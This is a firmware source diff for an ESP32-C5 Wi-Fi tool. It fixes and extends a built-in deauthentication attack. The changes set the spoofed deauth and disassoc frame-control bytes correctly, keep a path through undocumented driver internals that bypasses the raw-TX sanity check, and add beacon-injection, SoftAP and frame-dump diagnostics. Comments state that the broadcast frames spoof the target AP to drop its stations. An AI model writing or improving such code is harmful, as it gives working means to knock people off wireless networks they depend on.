@@ -23,7 +23,7 @@ namespace {
 // ---------------------------------------------------------------------------------------------
 // Tunables
 // ---------------------------------------------------------------------------------------------
-constexpr const char* kVersion = "1.2.4";
+constexpr const char* kVersion = "1.2.5";
 constexpr uint32_t kDwellMs = 220;          // Dwell per channel (200–400 ms)
 constexpr uint32_t kUiIntervalMs = 120;     // UI refresh cadence
 constexpr int kStrongThresholdDbm = -65;    // "Strong" frame threshold
@@ -196,6 +196,16 @@ volatile bool deauthActive = false;
 bool deauthParked = false;      // like huntParked: we hold the park on the target's channel
 volatile uint32_t deauthSent = 0, deauthTxFail = 0;
 uint32_t deauthStartMs = 0;     // millis() when the current attack started; serviceDeauth enforces kDeauthMaxMs
+bool deauthDumped = false;      // DIAGNOSTIC: dump the built frame once per attack
+
+// DIAGNOSTIC: beacon-injection self-test (see sendTestBeacon below), toggled with "txtest 1".
+volatile bool txTestActive = false;
+uint32_t txTestSent = 0, txTestFail = 0;
+// PROOF OF CONCEPT ONLY (not a feature): raw TX radiates nothing from an unassociated STA, so this brings
+// up a SoftAP to give the MAC a real BSS context and injects from WIFI_IF_AP instead. Toggled with
+// "softap 1". Tears down promiscuous sniffing while active — see docs/DEVELOPER.md section 11.
+wifi_interface_t txIface = WIFI_IF_STA;
+bool softApPoc = false;
 
 // DIAGNOSTIC build 2: the driver-internal deauth path. These live in libnet80211.a with no public
 // header. send_deauth_no_bss builds a deauth frame with the driver's own encoding (FC low byte 0xC0,
@@ -1407,6 +1417,7 @@ void startDeauth(const uint8_t* mac) {
     deauthSent = 0;
     deauthTxFail = 0;
     deauthStartMs = millis();
+    deauthDumped = false;
     // Note: the driver reads *adjacent* BSS words (&g_ic+16 / &g_ic+20 hold the STA/AP hmac pointers),
     // not fields of the ic struct itself. Panic inside send_setup if the word is 0, so fall back to AP.
     uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac (panic if 0)
@@ -1513,6 +1524,48 @@ void handleCommand(char* line) {
             Serial.printf("{\"t\":\"ack\",\"cmd\":\"deauth\",\"deauth\":null,\"park\":%d}\n", ch);
         if (deauthActive && serialRoom(140))   // DIAGNOSTIC: hmac slot used by the internal path + its state byte (picks the DA/SA mapping)
             Serial.printf("{\"t\":\"log\",\"msg\":\"deauth slot %lx hstate %d\"}\n", *(const uint32_t*)deauthSlotPad, deauthHstate);
+    } else if (!strcmp(line, "txtest")) {
+        // 0 = off, 1 = beacon with promiscuous RX still on, 2 = beacon with promiscuous RX turned off.
+        // Mode 2 tests whether promiscuous mode is what stops the PHY from transmitting.
+        const int mode = atoi(arg);
+        txTestActive = mode != 0 && wifiMode();
+        txTestSent = txTestFail = 0;
+        esp_err_t pr = ESP_OK;
+        if (mode == 2)      pr = esp_wifi_set_promiscuous(false);
+        else if (mode <= 0) pr = esp_wifi_set_promiscuous(true);
+        Serial.printf("{\"t\":\"ack\",\"cmd\":\"txtest\",\"txtest\":%d,\"mode\":%d,\"promisc_call\":\"%s\",\"ch\":%u}\n",
+                      txTestActive ? 1 : 0, mode, esp_err_to_name(pr), currentChannelNum);
+    } else if (!strcmp(line, "softap")) {
+        // PROOF OF CONCEPT: does the PHY transmit once the MAC has a real BSS context?
+        // "softap <ch>" brings up an OPEN AP on that channel; "softap 0" tears it down. Open + a quiet
+        // channel gives a signature (Channel + "Security: None") that a scanner reports even when it
+        // redacts SSIDs, which is the only witness available here.
+        const int wantCh = atoi(arg);
+        const bool on = wantCh != 0;
+        esp_err_t e1 = ESP_OK, e2 = ESP_OK;
+        if (on && !softApPoc) {
+            const uint8_t ch = static_cast<uint8_t>(wantCh);
+            esp_wifi_set_promiscuous(false);           // sniffing is off for the duration of the PoC
+            WiFi.mode(WIFI_AP_STA);
+            e1 = WiFi.softAP("BW-POC-AP", nullptr, ch) ? ESP_OK : ESP_FAIL;   // open: shows as Security None
+            txIface = WIFI_IF_AP;
+            softApPoc = true;
+            e2 = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            Serial.printf("{\"t\":\"ack\",\"cmd\":\"softap\",\"softap\":1,\"ch\":%u,\"ap\":\"%s\",\"setch\":\"%s\"}\n",
+                          ch, e1 == ESP_OK ? "up" : "FAILED", esp_err_to_name(e2));
+        } else if (!on && softApPoc) {
+            WiFi.softAPdisconnect(true);
+            WiFi.mode(WIFI_STA);
+            txIface = WIFI_IF_STA;
+            softApPoc = false;
+            esp_wifi_set_promiscuous(true);
+            Serial.print("{\"t\":\"ack\",\"cmd\":\"softap\",\"softap\":0}\n");
+        } else {
+            Serial.printf("{\"t\":\"ack\",\"cmd\":\"softap\",\"softap\":%d}\n", softApPoc ? 1 : 0);
+        }
+    } else if (!strcmp(line, "txstat")) {
+        Serial.printf("{\"t\":\"ack\",\"cmd\":\"txstat\",\"sent\":%lu,\"fail\":%lu,\"ch\":%u}\n",
+                      static_cast<unsigned long>(txTestSent), static_cast<unsigned long>(txTestFail), currentChannelNum);
     } else if (!strcmp(line, "reboot")) {
         Serial.print("{\"t\":\"ack\",\"cmd\":\"reboot\"}\n");
         delay(50);
@@ -1585,17 +1638,21 @@ void hopIfNeeded() {
     }
 }
 
-// Deauth TX. One deauth/disassoc MPDU (26 bytes), DA broadcast so every station on the BSS hears it,
-// SA/BSSID = the AP we spoof. The C5 driver takes raw frames through esp_wifi_80211_tx (the older
-// esp_wifi_send_mgmt_frame API is not exposed by its public headers). Its sanity check gates on the FC
-// bytes: it accepts 0x8X/0xDX low-byte patterns and rejects both spec-clean 0x30 and GhostESP's 0xC0
-// (verified empirically, and in ieee80211_raw_frame_sanity_check inside libnet80211.a). High byte just
-// needs bit6 clear. So: deauth = [0x80, 0x03], disassoc = [0xD0, 0x04]. Used as the fallback path when
-// the driver-internal slot (sendInternalKick) isn't available.
+// Deauth TX fallback, used only when the driver-internal slot (sendInternalKick) is unavailable. One
+// deauth/disassoc MPDU (26 bytes), DA broadcast so every station on the BSS hears it, SA/BSSID = the AP
+// we spoof. Raw frames go out through esp_wifi_80211_tx (the older esp_wifi_send_mgmt_frame API is not
+// exposed by the C5's public headers).
+//
+// NOTE: the C5's ieee80211_raw_frame_sanity_check in libnet80211.a rejects deauth/disassoc subtypes, so
+// this path is expected to fail with ESP_ERR_INVALID_ARG and show up in the `df` counter. It previously
+// sent [0x80,0x03] / [0xD0,0x04] to get *past* that check, but those are Beacon and Action frames: they
+// are accepted by the driver and then ignored by every station, i.e. the check was being satisfied with
+// frames that could never kick anyone. Failing visibly beats succeeding at nothing — the real attack path
+// is sendInternalKick(), which bypasses the sanity check entirely.
 void sendKickFrame(const uint8_t* bssid, bool disassoc) {
     static uint32_t seq = 0;
-    const uint8_t fc0 = disassoc ? 0xD0 : 0x80;
-    const uint8_t fc1 = 0x03;
+    const uint8_t fc0 = disassoc ? 0xA0 : 0xC0;   // subtype 10 disassoc / 12 deauth, type 0 management
+    const uint8_t fc1 = 0x00;                     // management frames carry no ToDS/FromDS
     uint8_t f[26];
     f[0] = fc0;                                    // accepted by the C5 raw-TX sanity check (see above)
     f[1] = fc1;                                    // deauth / disassociation subtype
@@ -1612,6 +1669,40 @@ void sendKickFrame(const uint8_t* bssid, bool disassoc) {
     else deauthTxFail = deauthTxFail + 1;
     if (e != ESP_OK && (deauthTxFail & 31u) == 0 && serialRoom(160))   // failures every 32nd, not a storm
         Serial.printf("{\"t\":\"log\",\"msg\":\"deauth tx: %s\"}\n", esp_err_to_name(e));
+}
+
+// DIAGNOSTIC: beacon injection, used to answer "can this radio transmit at all in promiscuous mode?".
+// Beacons (FC 0x80) are the one subtype the C5's raw-TX sanity check is known to accept, so if a scan from
+// another device cannot see this SSID, nothing we send is reaching the air and the deauth frame content is
+// beside the point. Toggled with "txtest 1" / "txtest 0"; transmits on whatever channel we are parked on.
+void sendTestBeacon() {
+    static const uint8_t kSrc[6] = {0x02, 0xBA, 0xAD, 0xBE, 0xEF, 0x01};
+    static const char kSsid[] = "BANDWATCH-TXTEST";
+    static uint32_t seq = 0;
+    uint8_t f[64];
+    int n = 0;
+    f[n++] = 0x80; f[n++] = 0x00;                       // beacon
+    f[n++] = 0x00; f[n++] = 0x00;                       // duration
+    memset(&f[n], 0xFF, 6); n += 6;                     // DA broadcast
+    memcpy(&f[n], kSrc, 6); n += 6;                     // SA
+    memcpy(&f[n], kSrc, 6); n += 6;                     // BSSID
+    const uint32_t s = ((++seq) & 0x0FFFu) << 4;
+    f[n++] = static_cast<uint8_t>(s); f[n++] = static_cast<uint8_t>(s >> 8);
+    memset(&f[n], 0, 8); n += 8;                        // timestamp
+    f[n++] = 0x64; f[n++] = 0x00;                       // beacon interval 100 TU
+    f[n++] = 0x01; f[n++] = 0x00;                       // capability: ESS
+    f[n++] = 0; f[n++] = sizeof(kSsid) - 1;             // SSID IE
+    memcpy(&f[n], kSsid, sizeof(kSsid) - 1); n += sizeof(kSsid) - 1;
+    f[n++] = 1; f[n++] = 4;                             // supported rates
+    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96;
+    f[n++] = 3; f[n++] = 1; f[n++] = currentChannelNum; // DS parameter set
+    const esp_err_t e = esp_wifi_80211_tx(txIface, f, n, false);
+    if (e == ESP_OK) txTestSent++;
+    else {
+        txTestFail++;
+        if ((txTestFail & 31u) == 1 && serialRoom(160))
+            Serial.printf("{\"t\":\"log\",\"msg\":\"txtest tx: %s\"}\n", esp_err_to_name(e));
+    }
 }
 
 extern "C" int chm_is_at_home_channel(void);   // ROM fn, no args: 1 = radio on the STA's home channel
@@ -1657,8 +1748,22 @@ void sendInternalKick() {
         const size_t off = (*reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40) & 2u) ? 8 : 0;
         if (deauthHstate == 0)   // hstate-0 branch puts broadcast in the BSSID slot → patch so SA==BSSID like a real AP kick
             memcpy(D + 16 + off, deauthBssid, 6);
-        D[off] = 0xC8;  D[1 + off] = 0x02;   // match the real TP-Link deauths seen on this BSS: FC [C8 02], dur 0x32
-        D[2 + off] = 0x32;  D[3 + off] = 0x00;
+        // FC must stay a *deauthentication*: type 0 (management), subtype 12 -> byte0 0xC0, and management
+        // frames carry no ToDS/FromDS, so byte1 is 0x00. (A previous build wrote [C8 02] here, which is
+        // type 2 / subtype 12 = a QoS-Null data frame: stations ignore it, so nothing was ever kicked.)
+        D[off] = 0xC0;  D[1 + off] = 0x00;
+        D[2 + off] = 0x32;  D[3 + off] = 0x00;   // duration 50 us, as real APs emit
+        // DIAGNOSTIC: dump the frame exactly as it will be handed to the MAC, once per attack, so the
+        // host can tell "frame is wrong" apart from "frame is right but the PHY never radiated".
+        if (!deauthDumped && serialRoom(240)) {
+            deauthDumped = true;
+            char hex[3 * 32 + 1];
+            const uint16_t flen = *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20);
+            for (int i = 0; i < 32; i++) snprintf(hex + i * 3, 4, "%02x ", D[off + i]);
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth frame off=%u len=%u d40=%04x: %s\"}\n",
+                          static_cast<unsigned>(off), flen,
+                          *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40), hex);
+        }
     }
     *reinterpret_cast<volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20) = 26;   // len 24→26 so the reason code fits on air (ppTxPkt prepends an 8-byte prefix)
     if (chm_is_at_home_channel()) ic_tx_pkt(desc);                   // TX now…
@@ -1674,6 +1779,7 @@ void sendInternalKick() {
 // Called from uiTimerCb (~120 ms): four frames per tick ≈ 33/s — enough to drop a network,
 // polite enough not to blank the whole street.
 void serviceDeauth() {
+    if (txTestActive && wifiRunning) { for (int k = 0; k < 4; k++) sendTestBeacon(); }
     if (!deauthActive || !wifiRunning) return;
     if (millis() - deauthStartMs > kDeauthMaxMs) {   // dead-man's switch: host/serial link may have dropped
         if (serialRoom(120))
